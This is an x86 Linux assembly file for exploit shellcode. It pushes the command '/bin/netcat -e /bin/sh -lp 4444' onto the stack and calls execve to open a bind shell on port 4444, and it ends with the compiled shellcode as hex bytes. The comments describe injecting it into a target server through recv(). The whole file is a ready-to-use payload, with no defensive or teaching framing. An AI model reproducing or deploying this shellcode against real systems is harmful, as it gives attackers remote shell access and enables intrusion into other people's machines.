; Shell2.asm
; Create an /bin/sh Session
; and bind it to netcat session
; It is assumed, that the server has
; also installed netcat; seems to be ok
; in this example !!!
; 
; Assembler: nasm
; Linker: ld
;
; ######################################################################

global _start


section .text
_start:
	; first we push the string /bin/netcat -e /bin/sh -lp 4444
	; onto the stack in the special case of this exploit we can
	; have null bytes in the hexdump, because we inject the
	; shellcode through recv()
	xor eax, eax
	push eax						; push 0x0 terminator at stack
	mov long ebp, esp				; save the current esp for inexing
	push 0x34343434					; push Pornnumber "4444" on stack
	push 0x00706c2d					; push "-lp\0"; null bytes are ok
	push 0x0068732f					; push "/sh\0"; null bytes are ok
	push 0x6e69622f					; push "/bin" on stack
	push 0x0000652d					; push "-e\0\0"; null bytes are ok
	push 0x00746163					; push "cat\0"; null bytes are ok
	push 0x74656e2f					; push "/net" on stack
	push 0x6e69622f					; push "/bin" on stack

	mov long ebx, esp				; first arg to execev is addr of the
									; above contructed string on the stack
									
	; now we push the sedcond arg for execev on the stack, this is
	; an null terminated array of pointers to the above strings
	; also here nullbytes are ok
	push eax						; push 0x00 on stack as terminator
	lea ecx, [ebp-4]				; load temporary adress of ebp-8 
	push ecx						; (Port-String)to ecx + push on stack
	lea ecx, [ebp-8]				; same for ebp-12 = "-lp" string
	push ecx
	lea ecx, [ebp-16]				; and for ebp-20 = "/bin/sh"
	push ecx
	lea ecx, [ebp-20]				; and for ebp-24 = "-e"
	push ecx
	lea ecx, [ebp-32]				; and for ebp-36 = "/bin/netcat"
	push ecx
	
	mov long ecx, esp				; second arg to execev is addr to
									; the above constructed array
									
	xor edx, edx					; third arg is *envp, here NULL
	
	mov long eax, 0x0b				; Set Interupt ID for execev
	int 0x80						; and trigger ...

	; now we wand a clean exit
	mov long eax, 0x00				; Set Interupt ID for exit
	mov long ebx, 0x05				; set Returncode, for debugging 0x05
	int 0x80						; triger interupt


; produced Shellcode after compiling and objdump:
;
;	\x31\xc0\x50\x89\xe5\x68\x34\x34\x34\x34\x68\x2d\x6c\x70\x00\x68
;	\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x68\x2d\x65\x00\x00\x68\x63
;	\x61\x74\x00\x68\x2f\x6e\x65\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50
;	\x8d\x4d\xfc\x51\x8d\x4d\xf8\x51\x8d\x4d\xf0\x51\x8d\x4d\xec\x51
;	\x8d\x4d\xe0\x51\x89\xe1\x31\xd2\xb8\x0b\x00\x00\x00\xcd\x80\xb8
;	\x00\x00\x00\x00\xbb\x05\x00\x00\x00\xcd\x80
	
; end of shell2.asm
